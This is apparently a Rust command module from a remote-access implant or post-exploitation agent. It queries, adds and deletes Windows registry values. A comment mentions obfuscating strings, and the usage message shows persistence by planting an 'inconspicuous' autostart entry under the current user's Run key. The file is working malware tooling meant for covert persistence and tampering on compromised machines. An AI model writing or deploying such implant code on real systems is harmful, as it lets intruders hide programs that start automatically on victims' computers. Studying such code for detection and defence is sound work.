use fmtools::format; // using obfstr to obfuscate

use winreg::enums::{
    HKEY_CLASSES_ROOT, HKEY_CURRENT_CONFIG, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS,
    KEY_QUERY_VALUE, KEY_READ, KEY_WRITE,
};
use winreg::RegKey;

pub(crate) fn reg(args: &[String]) -> String {
    // Parse arguments
    let (command, path, key, value) = match args.len() {
        2 => (args[0].clone(), args[1].clone(), String::new(), String::new()),
        3 => (args[0].clone(), args[1].clone(), args[2].clone(), String::new()),
        4 => (args[0].clone(), args[1].clone(), args[2].clone(), args[3..].join(" ")),
        _ => return format!( "Invalid number of arguments received. Usage: 'reg [query|add|delete] [path] <optional: key> <optional: value>'. Example: 'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run inconspicuous calc.exe'"),
    };

    // Split the path into hive and subkey
    let hive = match path.split('\\').next().unwrap().to_uppercase().as_str() {
        "HKEY_CURRENT_USER" => RegKey::predef(HKEY_CURRENT_USER),
        "HKEY_LOCAL_MACHINE" => RegKey::predef(HKEY_LOCAL_MACHINE),
        "HKEY_USERS" => RegKey::predef(HKEY_USERS),
        "HKEY_CLASSES_ROOT" => RegKey::predef(HKEY_CLASSES_ROOT),
        "HKEY_CURRENT_CONFIG" => RegKey::predef(HKEY_CURRENT_CONFIG),
        _ => return format!( "Invalid registry hive. Please use one of the following: HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG"),
    };
    let path = path.split('\\').skip(1).collect::<Vec<&str>>().join("\\");

    // Open the subkey with the appropriate permissions
    let (subkey, _perms) = match command.as_str() {
        "query" if key.is_empty() => match hive.open_subkey_with_flags(&path, KEY_READ | KEY_QUERY_VALUE) {
            Ok(subkey) => (subkey, KEY_READ | KEY_QUERY_VALUE),
            Err(_) => return format!("Failed to open registry key for reading/querying."),
        },
        "query" => match hive.open_subkey_with_flags(&path, KEY_READ) {
            Ok(subkey) => (subkey, KEY_READ),
            Err(_) => return format!("Failed to open registry key for reading."),
        },
        "add" | "delete" => match hive.open_subkey_with_flags(&path, KEY_READ | KEY_WRITE) {
            Ok(subkey) => (subkey, KEY_READ | KEY_WRITE),
            Err(_) => return format!("Failed to open registry key for reading/writing."),
        },
        _ => return format!("Unknown reg command. Please use 'reg query', 'reg add' or 'reg delete' followed by the path and value."),
    };

    // Perform the requested action
    match command.as_str() {
        "query" if key.is_empty() => {
            let mut result = String::new();
            for (name, value) in subkey.enum_values().map(std::result::Result::unwrap) {
                result.push_str(&format!("- "{name}": "{value}"\n"));
            }
            result
        }
        "query" => {
            if let Ok(value) = subkey.get_value(&key) {
                value
            } else {
                format!("Failed to read registry value.")
            }
        }
        "add" => {
            if subkey.set_value(&key, &value).is_ok() {
                format!("Successfully set registry value.")
            } else {
                format!("Failed to set registry value.")
            }
        },
        "delete" => {
            if subkey.delete_value(&key).is_ok() {
                format!("Successfully deleted registry value.")
            } else {
                format!("Failed to delete registry value.")
            }
        },
        _ => format!( "Unknown reg command. Please use 'reg query' or 'reg add' followed by the path and value."),
    }
}
